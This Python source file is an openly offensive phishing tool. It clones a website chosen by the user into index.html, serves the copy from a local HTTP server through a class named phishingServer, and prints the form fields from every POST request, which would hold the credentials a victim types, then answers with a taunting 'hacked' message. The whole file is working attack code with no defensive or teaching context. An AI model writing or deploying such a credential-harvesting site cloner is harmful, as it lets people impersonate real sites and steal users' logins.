import requests
from http.server import BaseHTTPRequestHandler, HTTPServer
import http.server
import time
import socketserver
import urllib.parse

URL = ''

class phishingServer(BaseHTTPRequestHandler):
	def __init__(self, *args):
		BaseHTTPRequestHandler.__init__(self, *args)

	def generateResponse(self):
		self.send_response(200)
		self.send_header('Content-type', 'text/html')
		self.end_headers()


	def do_GET(self):
		self.generateResponse()
		with open('./index.html', 'r') as page:
			lines = page.readlines()
			for line in lines:
				self.wfile.write(line.encode('utf-8'))

	def do_POST(self):
		contentLength = int(self.headers['content-length'])
		requestMessageBody = self.rfile.read(contentLength)
		parameters = requestMessageBody.decode().split('&')
		print(parameters)
		self.generateResponse()
		self.wfile.write("You've Been Hacked Bitch!".encode('utf-8'))


def host():
	hostname = 'localhost'
	port = 8080	
	serverAddress = (hostname, port)
	webserver = HTTPServer(serverAddress, phishingServer)
	webserver.serve_forever()

def clone(url):
	response = requests.get(url)
	print('[+] Response Made')

	if response.status_code == 200:
		print('[+] Site Found Cloning')

		with open('./index.html','w') as file:
			file.write(response.content.decode())
			print('[+] Cloning Complete!')
		
		return True

	elif response.status_code == 404:
		print('[-] Site Not Found Try again')
		return False

def main():
	global URL
	url = input('Enter Site to Clone: ')
	result = clone(url)
	URL = url
	if result:
		host()

	else:
		print('[-] Invalid URL!')

if __name__ == '__main__':
	main()